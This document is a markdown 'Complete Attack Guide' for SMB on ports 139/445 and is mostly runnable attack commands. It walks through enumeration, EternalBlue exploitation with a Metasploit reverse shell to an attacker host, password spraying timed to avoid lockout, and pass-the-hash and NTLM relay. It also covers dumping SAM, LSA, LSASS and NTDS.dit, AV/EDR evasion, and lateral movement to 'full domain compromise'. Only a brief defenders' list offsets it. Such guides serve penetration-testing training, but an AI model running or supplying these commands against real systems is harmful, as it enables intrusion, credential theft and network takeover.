# Port 139/445 - SMB (Server Message Block) - Complete Attack Guide

## Overview

**Protocol**: SMB (Server Message Block) / CIFS
**Ports**: 139 (SMB over NetBIOS), 445 (SMB over TCP)
**Transport**: TCP
**Encryption**: Optional (SMB 3.0+)
**Authentication**: NTLM, Kerberos, NTLMv2

## Attack Objectives

- **Null Session**: Anonymous enumeration
- **EternalBlue**: MS17-010 exploitation (RCE)
- **Pass-the-Hash**: Authenticate with NTLM hash
- **SMB Relay**: Relay authentication to other systems
- **Share Enumeration**: Discover accessible shares
- **Credential Brute Force**: Crack SMB credentials
- **Lateral Movement**: Access other Windows systems

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect SMB Service**
```bash
# Quick scan
nmap -p 139,445 192.168.1.100

# Service version
nmap -p 139,445 -sV 192.168.1.100

# Comprehensive SMB scripts
nmap -p 445 --script smb-* 192.168.1.100

# Network-wide discovery
nmap -p 445 192.168.1.0/24 --open
```

**1.2 SMB Version Detection**
```bash
# Detect SMB version
nmap -p 445 --script smb-protocols 192.168.1.100

# Detailed OS detection
nmap -p 445 --script smb-os-discovery 192.168.1.100

# Using smbclient
smbclient -L //192.168.1.100 -N

# Using CrackMapExec
crackmapexec smb 192.168.1.100
```

**1.3 NetBIOS Enumeration**
```bash
# NBTScan
nbtscan 192.168.1.0/24

# nmblookup
nmblookup -A 192.168.1.100

# Nmap
nmap -sU -p 137 --script nbstat 192.168.1.100
```

### Phase 2: Null Session Enumeration

**2.1 Null Session Connection**
```bash
# Using smbclient
smbclient -L //192.168.1.100 -N
smbclient //192.168.1.100/IPC$ -N

# Using rpcclient
rpcclient -U "" -N 192.168.1.100

# Using smbmap
smbmap -H 192.168.1.100

# Using enum4linux
enum4linux -a 192.168.1.100
```

**2.2 Enumerate Users**
```bash
# Using rpcclient
rpcclient -U "" -N 192.168.1.100
rpcclient $> enumdomusers
rpcclient $> queryuser 0x1f4
rpcclient $> enumdomgroups

# Using enum4linux
enum4linux -U 192.168.1.100

# Using Nmap
nmap --script smb-enum-users 192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 --users
```

**2.3 Enumerate Shares**
```bash
# Using smbmap
smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -R  # Recursive listing

# Using smbclient
smbclient -L //192.168.1.100 -N

# Using Nmap
nmap --script smb-enum-shares 192.168.1.100

# Using enum4linux
enum4linux -S 192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 --shares
```

**2.4 Enumerate Policies**
```bash
# Using enum4linux
enum4linux -P 192.168.1.100

# Get password policy
rpcclient -U "" -N 192.168.1.100
rpcclient $> getdompwinfo

# Using Nmap
nmap --script smb-security-mode 192.168.1.100
```

### Phase 3: Vulnerability Scanning

**3.1 EternalBlue (MS17-010)**
```bash
# Scan for EternalBlue
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Using Metasploit scanner
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run

# Check with CrackMapExec
crackmapexec smb 192.168.1.100 -M ms17-010
```

**3.2 Other SMB Vulnerabilities**
```bash
# Scan for all SMB vulnerabilities
nmap --script smb-vuln-* -p 445 192.168.1.100

# Specific CVEs:
# MS08-067
nmap --script smb-vuln-ms08-067 -p 445 192.168.1.100

# MS10-054
nmap --script smb-vuln-ms10-054 -p 445 192.168.1.100

# MS10-061
nmap --script smb-vuln-ms10-061 -p 445 192.168.1.100
```

**3.3 SMB Signing Check**
```bash
# Check if SMB signing required
nmap --script smb-security-mode 192.168.1.100

# Using rpcclient
rpcclient -U "" -N 192.168.1.100

# If signing not required = vulnerable to relay
```

### Phase 4: Credential Attacks

**4.1 Brute Force**
```bash
# Using Hydra
hydra -l Administrator -P passwords.txt smb://192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u Administrator -p passwords.txt

# Using Metasploit
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser Administrator
set PASS_FILE passwords.txt
run

# Using Medusa
medusa -h 192.168.1.100 -u Administrator -P passwords.txt -M smbnt
```

**4.2 Password Spraying**
```bash
# CrackMapExec (best tool for this)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Spray common passwords
crackmapexec smb 192.168.1.100 -u users.txt -p 'Summer2024' 'Welcome1' 'Password123'

# With delay to avoid lockout
for pass in 'Password123' 'Welcome1'; do
  crackmapexec smb 192.168.1.0/24 -u users.txt -p "$pass"
  sleep 600  # Wait 10 minutes
done
```

**4.3 Pass-the-Hash**
```bash
# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using Impacket psexec
psexec.py Administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using Metasploit
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit
```

### Phase 5: SMB Relay Attack

**5.1 Setup Responder**
```bash
# Start Responder to capture NTLM hashes
responder -I eth0 -wrf

# Captures authentication attempts from victims
# Works when they try to access attacker-controlled share
```

**5.2 SMB Relay with ntlmrelayx**
```bash
# Relay authentication to target
ntlmrelayx.py -tf targets.txt -smb2support

# With command execution
ntlmrelayx.py -t 192.168.1.100 -c "whoami"

# Dump SAM
ntlmrelayx.py -t 192.168.1.100 --dump-sam

# Dump LSASS
ntlmrelayx.py -t 192.168.1.100 --dump-lsass

# Interactive shell
ntlmrelayx.py -t 192.168.1.100 -i
```

**5.3 MultiRelay (older method)**
```bash
# Edit Responder.conf: SMB = Off, HTTP = Off
python MultiRelay.py -t 192.168.1.100 -u ALL
```

### Phase 6: Exploitation

**6.1 EternalBlue Exploitation**
```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# EternalBlue Python script
python eternalblue_exploit.py 192.168.1.100

# WARNING: Often unstable, can crash target
```

**6.2 PSExec Attack**
```bash
# Using Impacket
psexec.py administrator:password@192.168.1.100

# Using Metasploit
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser administrator
set SMBPass password
exploit

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u administrator -p password -x whoami
```

**6.3 WMIExec Attack**
```bash
# Using Impacket
wmiexec.py administrator:password@192.168.1.100

# Semi-interactive shell via WMI
# Stealthier than PSExec
```

**6.4 SMBExec Attack**
```bash
# Using Impacket
smbexec.py administrator:password@192.168.1.100

# Alternative to PSExec
# Uses different method
```

### Phase 7: Post-Exploitation

**7.1 Access Shares**
```bash
# Mount share (Linux)
mount -t cifs //192.168.1.100/C$ /mnt/smb -o username=administrator,password=password

# Using smbclient
smbclient //192.168.1.100/C$ -U administrator%password

# Download files
smbclient //192.168.1.100/C$ -U administrator%password
smb: \> get file.txt
smb: \> mget *.txt
smb: \> prompt off
smb: \> recurse on
smb: \> mget *

# Using smbget
smbget -R smb://192.168.1.100/Share -U administrator%password
```

**7.2 Credential Harvesting**
```bash
# Dump SAM with CrackMapExec
crackmapexec smb 192.168.1.100 -u administrator -p password --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u administrator -p password --lsa

# Dump NTDS.dit (Domain Controller)
crackmapexec smb 192.168.1.100 -u administrator -p password --ntds

# Using secretsdump
secretsdump.py administrator:password@192.168.1.100
```

**7.3 Lateral Movement**
```bash
# Spray credentials across network
crackmapexec smb 192.168.1.0/24 -u administrator -p password

# Execute command on multiple hosts
crackmapexec smb 192.168.1.0/24 -u administrator -p password -x whoami

# Pass-the-Hash across network
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM_hash>
```

## Bypass Techniques

### Bypassing SMB Signing

```bash
# Check if signing required
nmap --script smb-security-mode 192.168.1.100

# If not required, SMB relay possible
ntlmrelayx.py -t 192.168.1.100 -smb2support
```

### Bypassing AV/EDR

```bash
# Use WMI instead of PSExec
wmiexec.py administrator:password@192.168.1.100

# Use different execution methods
crackmapexec smb 192.168.1.100 -u administrator -p password -M mimikatz
crackmapexec smb 192.168.1.100 -u administrator -p password --exec-method smbexec
```

## Information Extraction

**Critical Information**:
```bash
# Users and groups
enum4linux -U -G 192.168.1.100

# Password policy
enum4linux -P 192.168.1.100

# Shares
smbmap -H 192.168.1.100

# Domain information
rpcclient -U administrator%password 192.168.1.100
rpcclient $> querydominfo

# Logged on users
crackmapexec smb 192.168.1.100 -u administrator -p password --loggedon-users
```

## Security Recommendations

**For Defenders**:
1. **Require SMB Signing** - Prevent relay attacks
2. **Disable SMBv1** - Many exploits target v1
3. **Patch MS17-010** - EternalBlue vulnerability
4. **Disable Null Sessions** - Prevent anonymous enumeration
5. **Strong Passwords** - Prevent brute force
6. **Network Segmentation** - Limit SMB access
7. **Monitor Logs** - Detect enumeration/attacks
8. **Disable unnecessary shares** - Minimize attack surface
9. **Enable firewall** - Block SMB from internet
10. **Use LAPS** - Randomize local admin passwords

## Common Mistakes

**Attacker Mistakes**:
1. Not checking for EternalBlue first
2. Forgetting to check SMB signing
3. Not trying null sessions
4. Crash systems with EternalBlue

**Defender Mistakes**:
1. SMBv1 still enabled - Vulnerable to EternalBlue
2. Null sessions allowed - Easy enumeration
3. SMB signing not required - Relay attacks possible
4. Weak/shared local admin passwords
5. SMB exposed to internet - Critical risk
6. Not patched for MS17-010

## Practical Attack Scenario

```bash
# Discovery
nmap -p 445 --open 192.168.1.0/24
# Found 10 hosts

# Check for EternalBlue
crackmapexec smb 192.168.1.0/24 -M ms17-010
# 192.168.1.50 - VULNERABLE!

# Try null session
smbmap -H 192.168.1.50
# Access denied

# Enumerate users (if possible)
enum4linux -U 192.168.1.50
# Found: administrator, john, mary

# Password spray
crackmapexec smb 192.168.1.50 -u users.txt -p 'Password123'
# SUCCESS: john:Password123

# Lateral movement
crackmapexec smb 192.168.1.0/24 -u john -p Password123
# john has access to 3 systems

# Dump credentials
crackmapexec smb 192.168.1.51 -u john -p Password123 --sam
# Got Administrator hash!

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H <hash>
# Full domain compromise!
```

## Tools Summary

**Best Tool for Each Task**:
- **Enumeration**: enum4linux, CrackMapExec, smbmap
- **Null Session**: rpcclient, smbclient
- **Brute Force**: CrackMapExec, Hydra
- **Exploitation**: Metasploit (EternalBlue), Impacket
- **Relay**: ntlmrelayx, Responder
- **Lateral Movement**: CrackMapExec
- **Credential Dumping**: secretsdump, CrackMapExec

## Related Attacks

- **Port 88 (Kerberos)**: Kerberoasting attacks
- **Port 389 (LDAP)**: Domain enumeration
- **Port 3389 (RDP)**: Often same credentials
- **Port 5985 (WinRM)**: PowerShell remoting

---

**Last Updated**: 2026-06-16
